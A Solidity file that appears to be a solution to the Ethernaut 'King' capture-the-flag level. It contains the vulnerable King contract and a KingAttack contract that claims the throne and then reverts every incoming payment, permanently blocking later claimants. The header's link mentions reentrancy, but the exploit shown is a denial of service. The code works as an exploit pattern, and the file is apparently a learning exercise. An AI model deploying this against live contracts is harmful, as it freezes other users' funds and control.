// https://hackernoon.com/hack-solidity-reentrancy-attack

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract King {

  address king;
  uint public prize;
  address public owner;

  constructor() payable {
    owner = msg.sender;  
    king = msg.sender;
    prize = msg.value;
  }

  receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    payable(king).transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
  }

  function _king() public view returns (address) {
    return king;
  }
}

contract KingAttack {
    King public kingContract;

    constructor() payable {
      // save contract to attack
      address kingAddress = 0x573D24d8068c635180A8F2ae4d0f486dCE0e2BaA;
      kingContract = King(payable(kingAddress));
      attack();
    }

    // Fallback is called when King sends Ether to this contract.
    fallback() external payable {
      require(false, "fallback called");
    }

    function transfer() external payable {
      require(false, "transfer called");
    }

    function attack() public payable {
      // check minimum balance
      require(msg.value >= kingContract.prize(), "value should be grater than current prize");
      (bool sent, bytes memory data) = address(kingContract).call{value: msg.value}("");
      require(sent, "failed to send ether from attack function");
    }

    function killme(address withdraw_to) external payable {
      address payable addr = payable(address(withdraw_to));
      selfdestruct(addr);
    }

    receive() external payable {
      require(false, "break this contract");
    }
}

/*
  Final note:
  Most of Ethernaut's levels try to expose (in an oversimplified form of course) something that actually happened — a real hack or a real bug.

 */